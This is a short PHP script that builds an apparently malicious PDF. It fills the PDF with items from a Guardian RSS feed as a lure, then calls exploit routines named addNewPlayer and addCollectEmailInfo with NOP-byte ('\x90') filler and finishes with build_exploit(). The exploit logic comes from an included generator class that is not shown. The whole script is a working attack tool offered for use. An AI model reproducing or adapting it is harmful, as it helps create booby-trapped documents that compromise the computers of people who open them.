<?php 
require('pdf_exploit_generator.class.php');
require('rss.class.php');

$url = 'http://www.guardian.co.uk/rss';
$rss = new RSS($url,5);
$rss = $rss->get_contents();
$pdf = new PDF_Exploit( 'P', 'mm', 'A4' );
for($i=0;$i<count($rss);$i++) {
	$pdf->AddPage();
	$pdf->SetFont('Arial','B',16);
	$pdf->WriteHTML($rss[$i]['title']);
	$pdf->SetFont('Arial','',16);
	$pdf->WriteHTML($rss[$i]['description']);
}
$pdf->addNewPlayer("\x90");
$pdf->addCollectEmailInfo("\x90");
$pdf->build_exploit();
$pdf->Output();

?>
